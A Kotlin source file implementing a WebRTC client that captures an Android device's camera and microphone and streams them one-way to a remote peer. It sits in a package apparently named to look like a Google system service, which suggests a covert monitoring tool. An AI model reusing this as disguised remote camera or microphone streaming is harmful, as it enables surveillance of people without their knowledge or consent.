package com.google.android.systemservice.utils

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import org.webrtc.*

data class WebRTCConfig(
    val context: Context,
    val deviceId: String,
    val streamType: String, // "camera" or "microphone"
    val iceServers: List<PeerConnection.IceServer> = WebRTCClient.DEFAULT_ICE_SERVERS
)

class WebRTCClient(
    private val config: WebRTCConfig,
    private val onSdpCreated: (String, String) -> Unit, // type, sdp
    private val onIceCandidate: (IceCandidate) -> Unit,
    private val onConnectionStateChanged: (PeerConnection.PeerConnectionState) -> Unit
) {
    companion object {
        private const val TAG = "WebRTCClient"
        
        // Default Google STUN servers
        val DEFAULT_ICE_SERVERS = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
        )
    }

    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var localAudioTrack: AudioTrack? = null
    private var localVideoTrack: VideoTrack? = null
    private var videoCapturer: VideoCapturer? = null
    private var eglBase: EglBase? = null
    private var surfaceTextureHelper: SurfaceTextureHelper? = null
    
    private val scope = CoroutineScope(Dispatchers.Default)

    init {
        initializePeerConnectionFactory()
    }

    private fun initializePeerConnectionFactory() {
        val options = PeerConnectionFactory.InitializationOptions.builder(config.context)
            .setEnableInternalTracer(true)
            .setFieldTrials("WebRTC-H264HighProfile/Enabled/")
            .createInitializationOptions()
        PeerConnectionFactory.initialize(options)

        eglBase = EglBase.create()
        if (eglBase == null) {
            Log.e(TAG, "Failed to create EglBase")
            return
        }
        val eglContext = eglBase?.eglBaseContext ?: run {
            Log.e(TAG, "EglBase context is null")
            return
        }
        val encoderFactory = DefaultVideoEncoderFactory(
            eglContext,
            true, // enableIntelVp8Encoder
            true  // enableH264HighProfile
        )
        val decoderFactory = DefaultVideoDecoderFactory(eglContext)

        peerConnectionFactory = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(encoderFactory)
            .setVideoDecoderFactory(decoderFactory)
            .setOptions(PeerConnectionFactory.Options().apply {
                disableEncryption = false
                disableNetworkMonitor = false
            })
            .createPeerConnectionFactory()

        Log.d(TAG, "PeerConnectionFactory initialized for ${config.streamType}")
    }

    fun createPeerConnection() {
        val rtcConfig = PeerConnection.RTCConfiguration(config.iceServers).apply {
            bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE
            rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE
            tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.ENABLED
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
        }

        val observer = object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                Log.d(TAG, "ICE candidate: ${candidate.sdp}")
                onIceCandidate(candidate)
            }

            override fun onConnectionChange(state: PeerConnection.PeerConnectionState) {
                Log.d(TAG, "Connection state: $state")
                onConnectionStateChanged(state)
            }

            override fun onSignalingChange(state: PeerConnection.SignalingState) {
                Log.d(TAG, "Signaling state: $state")
            }

            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
                Log.d(TAG, "ICE connection state: $state")
            }

            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState) {
                Log.d(TAG, "ICE gathering state: $state")
            }

            override fun onAddStream(stream: MediaStream) {}
            override fun onRemoveStream(stream: MediaStream) {}
            override fun onDataChannel(channel: DataChannel) {}
            override fun onRenegotiationNeeded() {
                Log.d(TAG, "Renegotiation needed")
            }

            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) {}
            override fun onAddTrack(receiver: RtpReceiver, streams: Array<out MediaStream>) {}
            
            // Deprecated but required by some WebRTC versions
            override fun onIceConnectionReceivingChange(receiving: Boolean) {
                Log.d(TAG, "ICE connection receiving: $receiving")
            }
        }

        peerConnection = peerConnectionFactory?.createPeerConnection(rtcConfig, observer)
        Log.d(TAG, "PeerConnection created")
    }

    fun addVideoTrack(capturer: VideoCapturer) {
        this.videoCapturer = capturer
        val eglContext = eglBase?.eglBaseContext ?: run {
            Log.e(TAG, "EglBase not available, cannot add video track")
            return
        }
        surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglContext)
        val videoSource = peerConnectionFactory?.createVideoSource(capturer.isScreencast)
        capturer.initialize(surfaceTextureHelper, config.context, videoSource?.capturerObserver)
        
        capturer.startCapture(1280, 720, 30)

        localVideoTrack = peerConnectionFactory?.createVideoTrack("video_${config.deviceId}", videoSource)
        peerConnection?.addTrack(localVideoTrack, listOf("${config.streamType}_stream"))
        Log.d(TAG, "Video track added")
    }

    fun addAudioTrack() {
        val audioConstraints = MediaConstraints().apply {
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
        }

        val audioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
        localAudioTrack = peerConnectionFactory?.createAudioTrack("audio_${config.deviceId}", audioSource)
        peerConnection?.addTrack(localAudioTrack, listOf("${config.streamType}_stream"))
        Log.d(TAG, "Audio track added")
    }

    fun createOffer() {
        val constraints = MediaConstraints().apply {
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"))
        }

        peerConnection?.createOffer(object : SdpObserver {
            override fun onCreateSuccess(sdp: SessionDescription) {
                peerConnection?.setLocalDescription(object : SdpObserver {
                    override fun onSetSuccess() {
                        Log.d(TAG, "Local description set")
                        onSdpCreated("offer", sdp.description)
                    }
                    override fun onSetFailure(error: String) {
                        Log.e(TAG, "Set local description failed: $error")
                    }
                    override fun onCreateSuccess(p0: SessionDescription?) {}
                    override fun onCreateFailure(p0: String?) {}
                }, sdp)
            }

            override fun onSetSuccess() {}
            override fun onCreateFailure(error: String) {
                Log.e(TAG, "Create offer failed: $error")
            }
            override fun onSetFailure(error: String?) {}
        }, constraints)
    }

    fun handleAnswer(sdp: String) {
        val answer = SessionDescription(SessionDescription.Type.ANSWER, sdp)
        peerConnection?.setRemoteDescription(object : SdpObserver {
            override fun onSetSuccess() {
                Log.d(TAG, "Remote description set")
            }
            override fun onSetFailure(error: String) {
                Log.e(TAG, "Set remote description failed: $error")
            }
            override fun onCreateSuccess(p0: SessionDescription?) {}
            override fun onCreateFailure(p0: String?) {}
        }, answer)
    }

    fun addIceCandidate(candidate: IceCandidate) {
        peerConnection?.addIceCandidate(candidate)
        Log.d(TAG, "ICE candidate added")
    }

    fun disposeAudioTrack() {
        try { localAudioTrack?.dispose() } catch (e: Exception) { Log.e(TAG, "Error disposing audio track: ${e.message}") }
        localAudioTrack = null
        Log.d(TAG, "Audio track disposed")
    }

    fun close() {
        try { videoCapturer?.stopCapture() } catch (e: Exception) { Log.e(TAG, "Error stopping capturer: ${e.message}") }
        try { videoCapturer?.dispose() } catch (e: Exception) { Log.e(TAG, "Error disposing capturer: ${e.message}") }
        videoCapturer = null
        try { localVideoTrack?.dispose() } catch (e: Exception) { Log.e(TAG, "Error disposing video track: ${e.message}") }
        localVideoTrack = null
        try { localAudioTrack?.dispose() } catch (e: Exception) { Log.e(TAG, "Error disposing audio track: ${e.message}") }
        localAudioTrack = null
        try { peerConnection?.close() } catch (e: Exception) { Log.e(TAG, "Error closing peer connection: ${e.message}") }
        try { peerConnection?.dispose() } catch (e: Exception) { Log.e(TAG, "Error disposing peer connection: ${e.message}") }
        peerConnection = null
        try { surfaceTextureHelper?.dispose() } catch (e: Exception) { Log.e(TAG, "Error disposing surface helper: ${e.message}") }
        surfaceTextureHelper = null
        try { peerConnectionFactory?.dispose() } catch (e: Exception) { Log.e(TAG, "Error disposing factory: ${e.message}") }
        peerConnectionFactory = null
        try { eglBase?.releaseSurface() } catch (e: Exception) { Log.e(TAG, "Error releasing surface: ${e.message}") }
        try { eglBase?.release() } catch (e: Exception) { Log.e(TAG, "Error releasing EGL: ${e.message}") }
        eglBase = null
        Log.d(TAG, "WebRTC client closed")
    }
}
